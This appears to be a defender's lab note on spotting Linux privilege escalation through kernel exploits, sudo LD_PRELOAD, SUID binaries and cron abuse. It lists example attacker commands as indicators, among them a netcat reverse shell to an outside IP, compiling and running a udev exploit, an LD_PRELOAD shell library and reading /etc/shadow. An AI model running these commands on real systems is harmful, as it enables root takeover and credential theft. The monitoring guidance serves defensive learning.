# Linux Privilege Escalation 
## What this is

Linux privilege escalation is when an attacker starts as a normal user (ex: `msfadmin`) and finds a way to become **root**. In this lab the common paths are: kernel exploit (old 2.6.x), sudo misconfig (`LD_PRELOAD`), bad SUID binaries, and unsafe cron jobs. 

---

## What to monitor on the Linux machine 

### 1) Enumeration tooling

Tools like LinEnum / Linux Exploit Suggester are usually copied to `/tmp` or home dirs and executed. Indicators:

* executable scripts suddenly appearing (`LinEnum.sh`, `linux-exploit-suggester.sh`)
* lots of "discovery" commands executed quickly (find SUID, reading cron, reading sudoers)

Example commands that attackers run (high signal in audit logs):

```bash
find / -perm -u=s -type f 2>/dev/null
cat /etc/crontab
sudo -l
uname -a
```



### 2) Kernel exploit behavior (udev example)

Old kernel privesc exploits usually show:

* compilation of exploit code (`gcc 8572.c -o udev_exploit`)
* creation of a payload script in `/tmp` (like `/tmp/run`)
* suspicious outbound connections if the payload is a reverse shell (ex: netcat to attacker)
  Examples from lab style:

```bash
gcc 8572.c -o udev_exploit
echo "nc 192.168.0.1 12345 -e /bin/bash" >> /tmp/run
./udev_exploit 2265
```



### 3) sudo misuse + LD_PRELOAD

Indicators:

* `sudo` executed with `LD_PRELOAD=...`
* creation of `.so` files (shared libraries) like `shell.so`
  Examples:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=./shell.so less test
```



### 4) SUID abuse (GTFOBins-style)

Indicators:

* execution of unusual SUID binaries (custom copies like `./less`)
* reading sensitive files (`/etc/shadow`) from an unexpected user context
  Example:

```bash
./less /etc/shadow
```



### 5) Cron job abuse

Indicators:

* editing scripts called by cron
* writes to cron directories (`/etc/cron.*`, `/etc/cron.d/`)
* suspicious executables dropped in writable PATH locations (`/tmp/tar` trick)
  Discovery commands:

```bash
ls -la /etc/cron.d/
cat /etc/crontab
```

## notes

* `sudo LD_PRELOAD=...` is almost always bad in real systems. 
* `gcc` + exploit filenames + `/tmp/run` + `nc -e /bin/bash` is a strong chain for "local exploit -> root shell". 
* cron file modifications should be treated as potential persistence. 
